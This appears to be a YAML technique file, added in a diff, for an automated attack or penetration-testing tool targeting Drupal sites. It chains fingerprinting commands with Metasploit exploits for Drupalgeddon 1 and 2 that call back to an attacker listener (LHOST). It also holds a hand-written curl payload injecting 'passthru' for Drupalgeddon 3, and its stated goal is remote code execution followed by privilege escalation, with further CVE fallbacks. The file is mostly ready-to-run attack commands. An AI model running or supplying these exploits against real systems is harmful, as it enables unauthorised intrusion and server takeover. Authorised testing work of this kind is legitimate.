@@ -1,0 +1,42 @@
+id: tech_drupal
+title: "Drupal — Drupalgeddon 1/2/3 + REST API exploit chain"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["drupal", "/sites/default", "/modules/system", "x-drupal-cache"]
+  cves:     ["CVE-2014-3704", "CVE-2018-7600", "CVE-2018-7602", "CVE-2019-6340", "CVE-2020-13671"]
+keywords: ["drupal", "drupalgeddon", "drupalgeddon2", "drupalgeddon3", "drupwn"]
+preconditions:
+  - "X-Generator: Drupal header OR /sites/default/files/ accessible"
+steps:
+  - tool: droopescan
+    cmd:  "droopescan scan drupal -u {base_url} -t 8"
+    why:  "Version + plugin/theme inventory + known-CVE flagging"
+  - tool: drupwn
+    cmd:  "drupwn enum {base_url}"
+    why:  "Alternative scanner with cred-spray module"
+  - tool: curl
+    cmd:  "curl -s {base_url}/CHANGELOG.txt | head -3; curl -s {base_url}/core/CHANGELOG.txt | head -3"
+    why:  "Exact version disclosure (D7 vs D8/9/10 paths differ)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/drupal_drupageddon; set RHOSTS {target}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Drupalgeddon 1 (D7 ≤ 7.31, CVE-2014-3704) — SQLi → admin → PHP exec"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS {target}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Drupalgeddon 2 (D7/D8, CVE-2018-7600) — anon RCE via Form API"
+  - tool: curl
+    cmd:  "curl -s -X POST '{base_url}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup' -d 'form_id=user_pass&_triggering_element_name=name'"
+    why:  "Drupalgeddon 3 manual PoC (CVE-2018-7602) — auth required but tiny priv needed"
+  - tool: nuclei
+    cmd:  "nuclei -tags drupal -u {base_url}"
+    why:  "Comprehensive sweep across all known Drupal CVEs + misconfigs"
+expected_outcome: "PHP RCE as web user → privesc via SUID/sudo"
+fallbacks:
+  - "If REST module enabled → CVE-2019-6340 unserialize RCE (D8 < 8.5.11 / 8.6.10)"
+  - "Coder module exposed → CVE-2016-1000146"
+  - "Webform → unauth file upload to PHP"
+references:
+  - "https://www.drupal.org/security"
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal"
